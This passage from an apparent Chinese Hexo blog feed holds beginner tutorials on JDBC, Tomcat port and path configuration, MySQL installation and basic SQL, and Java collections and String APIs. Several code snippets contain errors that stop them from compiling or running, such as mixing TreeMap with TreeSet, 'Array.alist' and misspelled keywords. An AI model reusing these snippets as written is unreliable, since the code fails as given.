</p><p>2.获得数据库连接:</p><p>DriverManager.getConnection(“jdbc:mysql://127.0.0.1:3306/imooc”,”root”,”root”);</p><p>***注释：其中jdbc:mysql表示jdbc连接mysql，127.0.0.1:3306为服务器地址和端口，imooc为数据库名称，root分别是用户名和密码</p><p>3.创建Statement对象： conn.createStatement();  </p><h3 id="学生管理系统系统（控制台版）"><a href="#学生管理系统系统（控制台版）" class="headerlink" title="学生管理系统系统（控制台版）"></a>学生管理系统系统（控制台版）</h3><p>我写了一个对mysql进行增删查的管理系统，基于控制台<a href="https://pan.baidu.com/s/1zfpzp3Y0GxNbd-_VCkdsag" target="_blank" rel="noopener">百度网盘</a><br><img src="http://img.ahdy.top/2019-08-12_152641.png" alt></p><h5 id="献丑！"><a href="#献丑！" class="headerlink" title="献丑！"></a>献丑！</h5><h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><p>五、代码分析<br>　　在对数据库进行增删改查的过程中，可以发现其共性部分，即通用的流程：</p><p>　　(1)创建Connection对象、SQL查询命令字符串；</p><p>　　(2)对Connection对象传入SQL查询命令，获得PreparedStatement对象；</p><p>　　(3)对PreparedStatement对象执行executeUpdate()或executeQurey()获得结果；</p><p>　　(4)先后关闭PreparedStatement对象和Connection对象。</p><p>　　可见，使用JDBC时，最常打交道的是Connection、PreparedStatement这两个类，以及select中的ResultSet类。查阅Java API手册可以了解其具体的意义和方法。</p><p><code>Connection   java.sql    接口 Connection   所有超级接口：Wrapperpublic interface Connectionextends Wrapper</code></p><p>与特定数据库的连接（会话）。在连接上下文中执行 SQL 语句并返回结果。</p><p>Connection 对象的数据库能够提供描述其表、所支持的 SQL 语法、存储过程、此连接功能等等的信息。此信息是使用 getMetaData 方法获得的。</p><h3 id="PreparedStatemnt"><a href="#PreparedStatemnt" class="headerlink" title="PreparedStatemnt"></a>PreparedStatemnt</h3><p>   java.sql<br>   接口 PreparedStatement<br>   所有超级接口：<br>Statement, Wrapper<br>所有已知子接口：<br>CallableStatement<br>public interface PreparedStatementextends Statement<br>表示预编译的 SQL 语句的对象。</p><p>SQL 语句被预编译并存储在 PreparedStatement 对象中。然后可以使用此对象多次高效地执行该语句。</p><p>常用方法</p><p> boolean  execute()</p><pre><code>      在此 PreparedStatement 对象中执行 SQL 语句，该语句可以是任何种类的 SQL 语句。</code></pre><p> ResultSet  executeQuery()</p><pre><code>      在此 PreparedStatement 对象中执行 SQL 查询，并返回该查询生成的 ResultSet 对象。</code></pre><p> int  executeUpdate()</p><pre><code>  在此 PreparedStatement 对象中执行 SQL 语句，该语句必须是一个 SQL 数据操作语言（Data Manipulation Language，DML）语句，比如 INSERT、UPDATE 或 DELETE 语句；或者是无返回内容的 SQL 语句，比如 DDL 语句。</code></pre><p>　　</p><h4 id="ResultSet"><a href="#ResultSet" class="headerlink" title="ResultSet"></a>ResultSet</h4><p>　　</p><p>java.sql </p><h4 id="接口-ResultSet"><a href="#接口-ResultSet" class="headerlink" title="接口 ResultSet"></a>接口 ResultSet</h4><pre><code>所有超级接口： Wrapper</code></pre><p>所有已知子接口：<br>CachedRowSet, FilteredRowSet, JdbcRowSet, JoinRowSet, RowSet, SyncResolver, WebRowSet<br>public interface ResultSetextends Wrapper<br>表示数据库结果集的数据表，通常通过执行查询数据库的语句生成。<code>`</code></p><p>　　</p><h3 id="思考问题"><a href="#思考问题" class="headerlink" title="思考问题"></a>思考问题</h3><p>1.每次SQL操作都需要建立和关闭连接，会消耗大量的资源，如何避免？</p><p>可以采用连接池，对连接进行统一维护，不必每次都建立和关闭。事实上这是很多对JDBC进行封装的工具所采用的。</p><p>2.Java代码中，传入的数据格式与数据库定义不同怎么办？如把Java的String对象赋值给数据库的tinyint属性。</p><p>分析：在执行SQL语句时，数据库会尝试进行转换。根据我的实验，如果用内容为纯字母的String对象传入tinyint的age属性时，会被转化成0。具体转化规则应该和数据库有关。</p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JBDC </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat与服务器</title>
      <link href="/2019/08/06/web/tomcat/"/>
      <url>/2019/08/06/web/tomcat/</url>
      
        <content type="html"><![CDATA[<h3 id="Tomcat端口配置"><a href="#Tomcat端口配置" class="headerlink" title="Tomcat端口配置"></a>Tomcat端口配置</h3><p>tomcat服务器需配置三个端口才能启动，安装时默认启用了这三个端口，当要运行多个tomcat服务时需要修改这三个端口，不能相同。端口配置路径为tomcat\ conf\service.xml    </p><h5 id="修改Shutdown端口（默认为8005端口）"><a href="#修改Shutdown端口（默认为8005端口）" class="headerlink" title="修改Shutdown端口（默认为8005端口）"></a>修改Shutdown端口（默认为8005端口）</h5><p><code>&lt;Server port=&quot;8005&quot; shutdown=&quot;SHUTDOWN&quot;&gt;</code>  </p><h5 id="修改http访问端口（默认为8080端口）"><a href="#修改http访问端口（默认为8080端口）" class="headerlink" title="修改http访问端口（默认为8080端口）"></a>修改http访问端口（默认为8080端口）</h5><p>负责建立HTTP连接。在通过浏览器访问Tomcat服务器的Web应用时，使用的就是这个连接器。<br><code>&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;</code><br><code>&lt;!-- A &quot;Connector&quot; using the shared thread pool--&gt;</code><br><code>&lt;!-- &lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;</code>  </p><h5 id="AJP协议访问端口（默认为8009端口）"><a href="#AJP协议访问端口（默认为8009端口）" class="headerlink" title="AJP协议访问端口（默认为8009端口）"></a>AJP协议访问端口（默认为8009端口）</h5><p>负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。<br><code>&lt;!-- Define an AJP 1.3 Connector on port 8009 --&gt;</code><br><code>&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</code>  </p><h3 id="Tomcat项目路径映射"><a href="#Tomcat项目路径映射" class="headerlink" title="Tomcat项目路径映射"></a>Tomcat项目路径映射</h3><p>假如你写好了一个web项目，并且想发布到服务器上让全国各地的人都能访问你的网站，那么就需要使用一个url地址才能访问到你的web页面(通常是ip地址+项目路径才能访问的到！)，如果你想使用IP地址直接访问你的web界面，就需要对tomcat进行一定的修改。当然如果仅仅用于测试，可以不修改这些配置，但当域名解析的时候，就需要解析到一个ipv4的地址！这个地址通常就是你的服务器IP地址。  </p><h5 id="修改如下！"><a href="#修改如下！" class="headerlink" title="修改如下！"></a>修改如下！</h5><p>打开tomcat目录进入conf\service.xml<br>1.配置默认的项目路径<br>在tomcat的server.xml中<br><code>&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;              unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;              xmlValidation=&quot;false&quot; xmlNamespaceAware=&quot;false&quot;&gt;</code>  </p><p>　<code>&lt;/Host&gt;</code><br>在中间加上<br><code>&lt;Context path=&quot;&quot; docBase=&quot;/usr/local/tomcat/webapps/项目路径&quot; debug=&quot;0&quot; reloadable=&quot;true&quot; /&gt;</code><br><img src="http://img.ahdy.top/2019-08-07_102251.png" alt><br>这个路径不可以过深，一般指到你项目文件名就可以了，因为可能造成部分css、js代码未解析使界面布局没有样式，一般指到你项目文件名就可以。<br>2.修改tomcat\conf\web.xml<br><img src="http://img.ahdy.top/2019-08-07_102421.png" alt><br>这个路径一般就是设置主页面，欢迎界面的意思，路径可以具体！<br>假如你想设置的主页面是一个jsp文件，最好配置一下，你的项目文件/WEB-INF/web.xml<br><img src="http://img.ahdy.top/2019-08-07_102516.png" alt><br>当然浏览器不能直接对文件进行修改还需要使用一文本编辑器，比如notepad++。  </p><h3 id="服务器端口开放"><a href="#服务器端口开放" class="headerlink" title="服务器端口开放"></a>服务器端口开放</h3><p>这里讲的服务器并不是tomcat，当然tomcat也有端口开放，比如，80/8080端口，你可以配置要开放的端口当然也可以两个端口都开放。<br>当你部署好了web项目的时候，可能会出现访问不到网页的情况，这种情况可能是你购买的云主机没有开放端口而造成的，具体操作如下：<br>1.进入你云主机的控制台—&gt;进入云主机实例<br><img src="http://img.ahdy.top/2019-08-07_105209.png" alt><br>2.进入安全组配置<br><img src="http://img.ahdy.top/2019-08-07_105544.png" alt><br>3.加入安全组<br><img src="http://img.ahdy.top/2019-08-07_105700.png" alt><br>4.配置规则<br><img src="http://img.ahdy.top/2019-08-07_110427.png" alt><br><img src="http://img.ahdy.top/2019-08-07_110453.png" alt><br>服务器端口已经配置完成！  </p><h5 id="80和8080端口有什么区别？没有本质上的区别，80是因特尔提供服务的默认端口，8080是阿帕奇tomcat提供服务的默认端口"><a href="#80和8080端口有什么区别？没有本质上的区别，80是因特尔提供服务的默认端口，8080是阿帕奇tomcat提供服务的默认端口" class="headerlink" title="80和8080端口有什么区别？没有本质上的区别，80是因特尔提供服务的默认端口，8080是阿帕奇tomcat提供服务的默认端口"></a>80和8080端口有什么区别？没有本质上的区别，80是因特尔提供服务的默认端口，8080是阿帕奇tomcat提供服务的默认端口</h5>]]></content>
      
      
      <categories>
          
          <category> Tomcat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL入门</title>
      <link href="/2019/08/06/web/mysql2/"/>
      <url>/2019/08/06/web/mysql2/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQL的数据库创建、删除"><a href="#MySQL的数据库创建、删除" class="headerlink" title="MySQL的数据库创建、删除"></a>MySQL的数据库创建、删除</h3><p>下面为MySQL操作成功例子，相关命令我会放在本文档后面<br>1.首先，以管理员身份启动dos命令界面，切盘到MySQL的bin目录下<br><img src="http://img.ahdy.top/2019-08-06_133616.png" alt><br>2.启动MySQL服务，登陆MySQL<br><img src="http://img.ahdy.top/2019-08-06_134251.png" alt><br>3.输入<code>show databases;</code>显示MySQL当中的数据库，这些初始化的数据库，切记不可以动，它们关系着MySQL的功能是否正常运行！接着，输入了<code>create database firstdemo;</code>就成功新创建了一个数据库<br>当然也可以初始化创建数据库时对数据库的编码进行指定<br>输入<code>create database firstdemo2 character set gbk/utf8;</code>就能创建一个指定字符集编码的数据库  </p><h5 id="指定数据库编码有什么用？"><a href="#指定数据库编码有什么用？" class="headerlink" title="指定数据库编码有什么用？"></a>指定数据库编码有什么用？</h5><p>当外界数据编码于数据库编码不一致的时，数据传入进数据库里就会产生乱码，这也是最常见的问题之一！<br><img src="http://img.ahdy.top/2019-08-06_134511.png" alt><br>4.查看数据库字符集输入<code>show create database firstdemo;</code>删除数据库输入<code>drop database firstdemo;</code>之后发现firstdemo已经被删除<br><img src="http://img.ahdy.top/2019-08-06_142216.png" alt>  </p><h3 id="数据库的使用"><a href="#数据库的使用" class="headerlink" title="数据库的使用"></a>数据库的使用</h3><p>首先创建一个数据库然后建表,注意一定先use +数据库名才能使用建表命令，不然会报错!<br><img src="http://img.ahdy.top/2019-08-06_154548.png" alt></p><h3 id="MySQL常用SQL命令："><a href="#MySQL常用SQL命令：" class="headerlink" title="MySQL常用SQL命令："></a>MySQL常用SQL命令：</h3><h4 id="数据库相关SQL"><a href="#数据库相关SQL" class="headerlink" title="数据库相关SQL"></a>数据库相关SQL</h4><pre><code>1.查看所有数据库    show databases;2.创建数据库    -格式：create    database 数据库名    create database newdb1;    创建数据库并且指定字符集    create database newdb1 character set gbk/utf8;3.查看数据库的详情 可以查看数据库的字符集。    show create database 数据库名。    show create database newdb1;4.删除数据库    --格式：drop database 数据库名    drop database newdb2;5.使用数据库    use newdb1;#### 表相关的操作1.查看所有表    show tables;2.创建表    --格式：create table 表名(字段1 字段1 类型，字段2，字段2类型);    create table person(name varchar(10),age int);3.查看详情    show create table person;    --数据库表引擎    1.InnoDB:支持数据库的高级操作，比如：事物，外键，索引，约束等等。    2.myisam:不支持数据库的高级操作，只支持基础的增删改查。4.创建表指定引擎和字符集。    --格式：create table 表名(字段1 字段1 类型，字段2，字段2类型)engine=innodb/myisam charset=gbk/utf8;    create table t1(name varchar(10),age int)engine=innodb charset=gbk;5.查看表字段    desc t1;6.删除表    drop table t1;#### 数据相关的SQL create table hero(name varchar(10),age int);--全表插入格式：insert into 表名 values(值1,值2);insert into hero values(&#39;刘备&#39;,18);--指定字段插入    insert into hero(name) values(&#39;李白&#39;);--批量插入数据：insert into hero values(&#39;关羽&#39;,18),(&#39;张飞&#39;,18);insert into hero(name) values(&#39;李白&#39;),(&#39;白居易&#39;),(&#39;杜甫&#39;);### 查询数据    --格式：select 字段信息 from 表名 where 条件。1.查询所有数据，所有字段信息。    select * from hero;2.查询所有的名字.    select name from hero;3.查询年龄18岁人的所有信息。    seelct * from hero where age = 18;### 修改数据    --格式：update 表名 set 字段名=数据 where 过滤条件=数据.    update hero set age=25 where name=&#39;刘备&#39;;    --注意：如果不给条件则修改全表信息。### 删除数据    delete from 表名 where 条件。    delete from hero where name=&#39;杜甫&#39;;    delete from hero;  </code></pre><h3 id="MySQL常见问题汇总"><a href="#MySQL常见问题汇总" class="headerlink" title="MySQL常见问题汇总"></a>MySQL常见问题汇总</h3><h4 id="1-修改密码时，无法修改，发送异常信息"><a href="#1-修改密码时，无法修改，发送异常信息" class="headerlink" title="1.修改密码时，无法修改，发送异常信息"></a>1.修改密码时，无法修改，发送异常信息</h4><p>报错信息如下：</p><p>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that<br>corresponds to your MySQL server version for the right syntax to use near ‘(‘123<br>456’) where user=’root’’ at line 1</p><p>看过很多方法：</p><p> 总结如下：</p><p> 使用win+R 输入CMD进入dos界面。进入你的mysql安装路径下面的bin文件家里面；</p><p>先使用：mysql -u root -p 输入密码进入mysql命令窗口mysql&gt;:</p><p>修改密码：</p><p>方法1：</p><pre><code>     set password for 用户名@localhost=password(&#39;新密码&#39;)；</code></pre><p>方法2：</p><pre><code>    mysql&gt;set password =password(&#39;你的密码&#39;);    mysql&gt;flush privileges;</code></pre><p>方法3：</p><pre><code>   ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;;（我采用的是这个方式进行密码修改的，前两种仍然报错）；</code></pre><h4 id="2-MySQL服务无法启动成功，服务没有报错"><a href="#2-MySQL服务无法启动成功，服务没有报错" class="headerlink" title="2.MySQL服务无法启动成功，服务没有报错"></a>2.MySQL服务无法启动成功，服务没有报错</h4><p>这种情况分为多种可能：<br>1.没有配置好ini文件<br>2.MySQL文件夹下没有date目录<br>3.系统内存在多个不同版本的MySQL服务，并且服务在运行中<br>4.端口占用<br>这些潜在问题可能不会在启动SQL时发生，我建议，在发生未知错误时推到重新来，如果你实在装不好，可以加我QQ联系，我远程给你ko！ok？嗯，下一篇—MySQL进阶。</p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL安装</title>
      <link href="/2019/08/01/web/mysql/"/>
      <url>/2019/08/01/web/mysql/</url>
      
        <content type="html"><![CDATA[<p>MySQL是什么，MySQL是目前世界上最常用的关系型数据库，数据库啊，顾名思义，它就是存放数据的地方，这些数据，可以是你的一些注册信息，年龄，邮箱，账号密码，比如你要登陆某个平台or app时，你所输入的账号密码，就会通过网络，发送请求数据，与数据库当中的信息进行校验，通过的话，就登陆成功了，不通过当然就会报异常咯。<br>    -之前通过流操作文件的方式存储数据。—弊端。<br>    1.执行效率<br>    2.进行增删改查操作，代码书写比较麻烦<br>    3.一般只能保存文本数据。</p><pre><code>Mysql是轻量级，开源的，免费的数据存储集合。#### 什么是DBDB:Database 数据库 ,指一个文件集合。#### 什么是DBMSDBMS:Database Management System 数据库管理系统,用于管理数据库的软件。常见的DBMS：Mysql、Oracle、DB2、SQLServer SQLite#### 数据库的分类1.关系型数据库：经过数学论证开源保存现实生活中的各种关系，以表为单位保存数据。2.非关系型数据库(网状型数据库):用于决绝某些特定场景 比如：高并发访问时的数据缓存。举例：Redis 以key-value形式保存数据的。</code></pre><h3 id="MySQL安装："><a href="#MySQL安装：" class="headerlink" title="MySQL安装："></a>MySQL安装：</h3><p>方式一·<a href="https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-8.0.11-winx64.zip" target="_blank" rel="noopener">直接下载</a>版本为8.0.11，如果想下载最新版请进入官网！<br>方式二·<a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener">官网下载</a><br>我也不知道这官网为啥这么卡….<br>进去之后大概就是这个样的，选红圈的下，不要问为啥下这个，我也不知道<br><img src="http://img.ahdy.top/2019-08-01_151652.png" alt><br>然后会进到这个页面，点击下面的，”不用，谢谢，仅开始下载（no thanks just<strong>**</strong>）”如果我翻译的不对也不要讲！<br><img src="http://img.ahdy.top/2019-08-01_151620.png" alt></p><p>方式三·<a href="https://share.weiyun.com/5BeMjhg" target="_blank" rel="noopener">网盘下载</a><br>我这里提供了一个MySQL5.6版本+Sqlyog，这个操作比较简单，解压版的，内包含启动MySQL的.bat脚本，解压好后以管理员身份启动服务就可以用了，关闭同样操作。里面有不同的版本，不要胡乱下，选择你操作系统相同的系统位数下载！  </p><h3 id="MySQL配置环境变量"><a href="#MySQL配置环境变量" class="headerlink" title="MySQL配置环境变量"></a>MySQL配置环境变量</h3><p>右键此电脑打开属性，打开高级系统设置<br><img src="http://img.ahdy.top/2019-08-06_094215.png" alt><br><img src="http://img.ahdy.top/2019-08-06_094248.png" alt><br><img src="http://img.ahdy.top/2019-08-06_094319.png" alt><br>进入系统的path变量选择新增，这个路径就是你安装好的MySQL/bin路径，将绝对路径复制粘贴进来就完成了MySQL环境变量的配置。</p><h3 id="官方版MySQL起步："><a href="#官方版MySQL起步：" class="headerlink" title="官方版MySQL起步："></a>官方版MySQL起步：</h3><p>要用MySQL，就要会sql命令，这个命令emmm就像我们的c语言一样，起到一个入门作用，官网上下载的也好，我附加上去的解压版也好，都得会sql命令才能对数据库操作，当然这是就体现了图形化工具的好处，比如navicat，sqlyog。<br>下面教你下载好后怎么对数据库初始化~<br>我相信你此时已经下载好了MySQL，并且把它解压到一个安全的地方，（不要放中文路径的文件内）<br>双击进入你解压好的文件,里面创建一个后缀为.ini的配置文件<br><img src="http://img.ahdy.top/2019-08-06_090425.png" alt></p><h5 id="文件内容如下："><a href="#文件内容如下：" class="headerlink" title="文件内容如下："></a>文件内容如下：</h5><pre class=" language-#"><code class="language-#">   [client] # 设置mysql客户端默认字符集default-character-set=utf8[mysqld] # 设置3306端口port = 3306 # 设置mysql的安装目录,这个路径关系着MySQL能否启动，解压在哪就填哪basedir=D:\\mysql-8.0.11 # 设置 mysql数据库的数据的存放目录，MySQL 8+ 不需要以下配置，系统自己生成即可，否则有可能报错 # datadir=C:\\web\\sqldata 不用动  允许最大连接数max_connections=20 # 服务端使用的字符集默认为8比特编码的latin1字符集character-set-server=utf8 # 创建新表时将使用的默认存储引擎 default-storage-engine=INNODB </code></pre><p>到这儿MySQL的配置已经完成，下面需要对它进行初始化操作<br>1.以管理员身份打开 cmd 命令行工具，切换目录：<br><code>D:</code><br><code>cd mysql-8.0.11\bin</code><br><img src="http://img.ahdy.top/2019-08-06_091117.png" alt><br>2.初始化<br><code>mysqld --initialize --console</code><br>执行完成后，会输出 root 用户的初始默认密码，如：<br>…<br>2018-04-20T02:35:05.464644Z 5 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: APWCY5ws&amp;hjQ<br>…<br>APWCY5ws&amp;hjQ 就是初始密码，后续登录需要用到（注意！：请先保存或者记住它），你也可以在登陆后修改密码。</p><p>3.输入以下安装命令：</p><p><code>mysqld install</code><br>4.启动输入以下命令即可启动：</p><p><code>net start mysql</code>  </p><p><img src="http://img.ahdy.top/2019-08-01_160546.png" alt> </p><h3 id="登录-MySQL"><a href="#登录-MySQL" class="headerlink" title="登录 MySQL"></a>登录 MySQL</h3><p>当 MySQL 服务已经运行时, 我们可以通过 MySQL 自带的客户端工具登录到 MySQL 数据库中, 首先打开命令提示符, 输入以下格式的命名:</p><h5 id="mysql-h-主机名-u-用户名-p-简写法：mysql-u-root-p"><a href="#mysql-h-主机名-u-用户名-p-简写法：mysql-u-root-p" class="headerlink" title="mysql -h 主机名 -u 用户名 -p(简写法：mysql -u root -p)"></a>mysql -h 主机名 -u 用户名 -p(简写法：mysql -u root -p)</h5><p>参数说明：</p><p>-h : 指定客户端所要登录的 MySQL 主机名, 登录本机(localhost 或 127.0.0.1)该参数可以省略;<br>-u : 登录的用户名;<br>-p : 告诉服务器将会使用一个密码来登录, 如果所要登录的用户名密码为空, 可以忽略此选项。<br>如果我们要登录本机的 MySQL 数据库，只需要输入以下命令即可：</p><p>mysql -u root -p<br>按回车确认, 如果安装正确且 MySQL 正在运行, 会得到以下响应:</p><p>Enter password:<br>若密码存在, 输入密码登录, 不存在则直接按回车登录。登录成功后你将会看到 Welcome to the MySQL monitor… 的提示语。</p><p>然后命令提示符会一直以 mysq&gt; 加一个闪烁的光标等待命令的输入, 输入 exit 或 quit 退出登录，一般默认用户名都是root，密码就是初始化的时候的密码  </p><h3 id="密码修改"><a href="#密码修改" class="headerlink" title="密码修改"></a>密码修改</h3><p><img src="http://img.ahdy.top/2019-08-06_092528.png" alt>  </p><p><code>ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;123456&#39;;</code><br>登陆密码为你初始化生成的密码，在开启数据库服务的条件下，才能登陆成功  </p><p>后面123456是你修改的密码，你也可以随意更改，但最好不要包含特殊符号，because很有可能造成sqlyog等图形化工具连接报错！</p><h5 id="接下来，尽情挖掘新大陆吧-少年！下一篇—-mysql入门（MySQL—-sql命令基础操作—-常见问题）"><a href="#接下来，尽情挖掘新大陆吧-少年！下一篇—-mysql入门（MySQL—-sql命令基础操作—-常见问题）" class="headerlink" title="接下来，尽情挖掘新大陆吧,少年！下一篇—-mysql入门（MySQL—-sql命令基础操作—-常见问题）"></a>接下来，尽情挖掘新大陆吧,少年！下一篇—-mysql入门（MySQL—-sql命令基础操作—-常见问题）</h5>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java常用API（详细实例2）</title>
      <link href="/2019/07/29/java/java7/"/>
      <url>/2019/07/29/java/java7/</url>
      
        <content type="html"><![CDATA[<h4 id="一-Hashset集合"><a href="#一-Hashset集合" class="headerlink" title="一 Hashset集合"></a>一 Hashset集合</h4><p>这是一个无序去重的集合，在它的内部不存在重复的数据，这个原理基于<br>equalsHashset<br>虽然它是无序的，但是TreeMap弥补了这个缺陷<br><code>TreeMap &lt;Integer&gt;tree =new TreeSet&lt;&gt;();</code><br>Set集合的实现类是HashSet() 与Arraylist区别是：算法不同<br>但是2个类都是继承与Collection。<br>假如有一个数组，里面包含重复的元素，你可以按照下面的形式进行元素去重</p><pre class=" language-String[]names={&quot;tom&quot;,&quot;bob&quot;,&quot;bob&quot;};"><code class="language-String[]names={&quot;tom&quot;,&quot;bob&quot;,&quot;bob&quot;};">Set <String>stes =new Hashset<>(names);System.out.println(stes);</code></pre><h4 id="数组转集合"><a href="#数组转集合" class="headerlink" title="数组转集合"></a>数组转集合</h4><p> String []names={“tom”,”bob”,”bob”};<br>list<string>list =Array.alist(names);<br>System…..//输出</string></p><pre class=" language-API"><code class="language-API">list.add("???");  list.remove("???");//可以传入下标或者字符串  list.get(0);//获取某个下标值  list.set(0,"???");//修改某个下标的值  list.contains("???");//判断集合内是否有这个元素Collections.sort();//排序Collections.shuffle();//随机置换，可用于扑克牌</code></pre><h4 id="集合转数组"><a href="#集合转数组" class="headerlink" title="集合转数组"></a>集合转数组</h4><p><code>list&lt;String&gt;list2=new Arraylist(???);Object[]objs=list2.toArray();//无指定类型  String[]names=list.toArray(new String[]{});//转换成指定类型的数组</code> </p><h3 id="二、Map集合"><a href="#二、Map集合" class="headerlink" title="二、Map集合"></a>二、Map集合</h3><pre><code>Map集合是一个独立的集合不继承与CollectionHashTable() 是jdk1.0提供的，是线程安全的，性能比较慢HashMap()   是jdk1.2提供的，是非线程安全的，性能相对于来说快一些。Map&lt;String, String&gt; maps = new HashMap&lt;String, String&gt;();    maps.put(&quot;3866&quot;, &quot;董大炮&quot;);    maps.put(&quot;8888&quot;, &quot;剑&quot;);    maps.put(&quot;88888&quot;, &quot;Andi&quot;);    maps.put(&quot;8888&quot;, &quot;剑&quot;);    System.out.println(maps);    System.out.println(maps.get(&quot;3866&quot;));    System.out.println(maps.size());    Set&lt;Entry&lt;String, String&gt;&gt; setMap =  maps.entrySet();//遍历map    System.out.println(setMap);    System.out.println(setMap.iterator().next());    System.out.println(setMap.iterator().next().getKey());//打印Key    System.out.println(setMap.iterator().next().getValue());//打印值    Set&lt;String&gt; set = maps.keySet();    System.out.println(set);    Collection&lt;String&gt; cs =  maps.values();    System.out.println(cs);    //根据key删除元素，返回被删除的value    String rvalue = maps.remove(&quot;8888&quot;);    System.out.println(rvalue);    System.out.println(maps);    //判断是否有指定的key    System.out.println(maps.containsKey(&quot;38661&quot;));    //判断是否有指定的value    System.out.println(maps.containsValue(&quot;Andis&quot;));    Map&lt;Integer, Student&gt; stuMap = new HashMap&lt;&gt;();    stuMap.put(1, new Student(&quot;Jerry&quot;, 18));    stuMap.put(2, new Student(&quot;Jerry&quot;, 18));    System.out.println(stuMap);//hashMap中的元素重复与否与key相关，key的底层就是Set  map集合应用，统计字符串当中，每一个字出现的次数    public static void main(String[] args) {    // TODO Auto-generated method stub    NumberFormat number =NumberFormat.getInstance();    String s=&quot;如果你是在一个面临美国制裁的国家使用GitHub的在线服务，你的账号可能会因此被限制只能使用最基本的产品。GitHub 本周告诉居住在克里米亚的21岁俄罗斯公民 Anatoliy Kashkin，由于美国的贸易管制，它“限制”了他的 GitHub 账户。Anatoliy Kashkin 在 YC 上发了帖子说明此事，据说与该开发者同一地区的其他开发者也同样被限制。GitHub 确实为开发者提供了一个争议限制的申诉表格，但 Kashkin 声称通过上诉限制没有任何好处：“这是毫无意义的。我的帐户被标记为限制，为了取消标记，我必须提供一份证据证明我不住在克里米亚。我实际上是一名克里米亚人注册的俄罗斯公民，我身处其中克里米亚，我一生都住在克里米亚。”&quot;;System.out.println(s); Count(s); }public static void Count(String s) {    int count = 0 ;    String sss=null;    NumberFormat number =NumberFormat.getInstance();    HashMap&lt;Character,Integer&gt; map =new HashMap&lt;&gt;();    int point;    for (int i = 0; i &lt;s.length() ; i++)    {        if(!map.containsKey(s.charAt(i)))        {            map.put(s.charAt(i),1);            }else {                 count = map.get(s.charAt(i));                count++;                map.put(s.charAt(i),count);                }         sss=number.format((float)map.get(s.charAt(i))/(float)s.length()*100);            System.out.println(sss);        }    System.out.println(map);System.out.println(&quot;\r&quot;);}</code></pre><h3 id="三、集合的继承结构"><a href="#三、集合的继承结构" class="headerlink" title="三、集合的继承结构"></a>三、集合的继承结构</h3><pre><code>                Collection        List                    Set                                MapArrayList    LinkedList        HashSet    SortedSet                HashMap        HashTable        SortedMap                                    TreeSet                                Properties        TreeMap以上是集合的继承结构，请务必知悉。</code></pre><h3 id="四、集合的复制"><a href="#四、集合的复制" class="headerlink" title="四、集合的复制"></a>四、集合的复制</h3><pre><code>Java默认的复制规则是浅层复制集合复制有2种形式1.clone()  是Object定义的.一般API都重写了这个方法2.使用复制构造器    List&lt;Entry&lt;String, Object&gt;&gt; lists = new ArrayList&lt;&gt;(map.entrySet());</code></pre><h4 id="五、同步化-线程安全"><a href="#五、同步化-线程安全" class="headerlink" title="五、同步化(线程安全)"></a>五、同步化(线程安全)</h4><pre><code>Collections.synchronizedList(list)可以将非线程安全的list包装为一个线程安全的如果将一个非线程安全的list包装为一个线程安全的转换以后就相当于VectorCollections.synchronizedMap(Map)可以将非线程安全的Map包装为一个线程安全的  </code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java常用API（详细实例1）</title>
      <link href="/2019/07/28/java/java6/"/>
      <url>/2019/07/28/java/java6/</url>
      
        <content type="html"><![CDATA[<h3 id="一、String-字符串"><a href="#一、String-字符串" class="headerlink" title="一、String 字符串"></a>一、String 字符串</h3><p>String是一个API提供的类，存放字符串。底层是char[]String字面量相同时，会替换为同一个String对象的引用。常量连接的结果也被优化为一个字符串.<br>String比较的时候用equals</p><h4 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h4><p>在字符串当中使用加号（a+=b）可以对字符串进行拼接<br>也可以使用StringfBuffer类进行拼接，元素插入<br>例如：<br><code>`</code> StringBuilder buider = new StringBuilder();<br>    buider.append(“李敖先生”).append(“的前妻”).append(“胡因梦女士”).insert(0, “大师”).append(“据说十分漂亮”).delet(4, 6);<br>    System.out.println(buider);</p><pre><code>相比较String而言StringBuffer的性能更加高效  可以通过:   System.currentTimeMillis();  对比如二者效率### 二、静态字符串Java编译期间(javac)，凡是字面量和常量的运算，都会先算出结果运行期当字符串池有String&quot;字面量&quot;时，Java会直接用，如果没有才创建。  &quot;&quot;就是一个对象 String是一个特殊的类### 三、API``` charAt()        根据指定的index下标返回指定的字符    length()        返回字符串的长度    trim();            去除前后两端的空白 \n \t \s    toLoweCase()    将字符串变为小写    